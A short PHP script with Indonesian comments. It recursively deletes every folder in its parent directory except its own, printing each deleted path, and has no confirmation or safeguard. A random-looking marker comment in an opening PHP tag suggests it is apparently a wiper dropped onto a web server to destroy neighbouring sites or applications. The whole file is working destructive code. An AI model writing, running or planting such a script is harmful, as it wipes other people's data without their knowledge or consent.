<?php /* Vm191xFubPrVQe9 */ ?>
<?php
// Direktori tempat file ini berada
$currentDir = basename(__DIR__);

// Direktori induk (../)
$parentDir = dirname(__DIR__);

// Scan isi direktori induk
$items = scandir($parentDir);

foreach ($items as $item) {
    if ($item === '.' || $item === '..') {
        continue;
    }

    $path = $parentDir . DIRECTORY_SEPARATOR . $item;

    // Hapus hanya folder, kecuali folder saat ini
    if (is_dir($path) && $item !== $currentDir) {
        if (deleteDirectory($path)) {
            echo "Deleted folder: $path\n";
        } else {
            echo "Failed to delete: $path\n";
        }
    }
}

// Fungsi rekursif hapus folder dan isinya
function deleteDirectory($dir) {
    if (!file_exists($dir)) return false;
    if (!is_dir($dir)) return unlink($dir);

    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}
?>
